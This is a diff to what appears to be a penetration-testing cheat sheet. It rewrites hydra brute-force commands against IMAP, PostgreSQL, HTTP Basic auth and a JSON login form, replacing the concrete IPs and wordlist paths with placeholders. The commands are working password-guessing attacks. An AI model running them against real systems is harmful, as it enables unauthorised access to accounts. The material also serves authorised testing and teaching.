@@ -46,13 +46,15 @@ Make sure there are no maximum number of login attempts. To perform a manual che
 IMAP
 
 ```shell
-hydra -L usernames.txt -P wordlists.txt -s 143 -f 192.168.0.1 imap
+hydra -L <usernameList> -P <passwordList> -s 143 -f <target ip> imap
+# -f exit when a login/pass pair is found
+# -s target port
 ```
 
 PostgreSQL
 
 ```shell
-hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.121.60 postgres
+hydra -l <username> -P <passwordList> <target ip> postgres
 ```
 
 for normal connection
@@ -64,7 +66,8 @@ psql -U <username> -p 5432 -h <hostname or ip>
 HTTP Basic Authentication 
 
 ```shell
-hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /      # (/):default 
+hydra -l admin -P <passwordList> -s 80 -f <target ip> http-get /
+# (/):default 
 ```
 
 JSON
@@ -72,7 +75,7 @@ JSON
 ```shell
 # Content-Type、Accept、Origin、X-Requested-With、Referer and CSRF checks、Cookies
 # use cURL to check necessary headers
-hydra -l admin -P ~/Documents/rockyou.txt test.com https-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Origin\: https\://test.com:H=Accept\: application/json, text/plain, */*:H=Content-Type\: application/json;charset=utf-8"
+hydra -l admin -P <passwordList> <target ip> https-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Origin\: https\://test.com:H=Accept\: application/json, text/plain, */*:H=Content-Type\: application/json;charset=utf-8"
 ```
 
 ### :open_file_folder: cewl
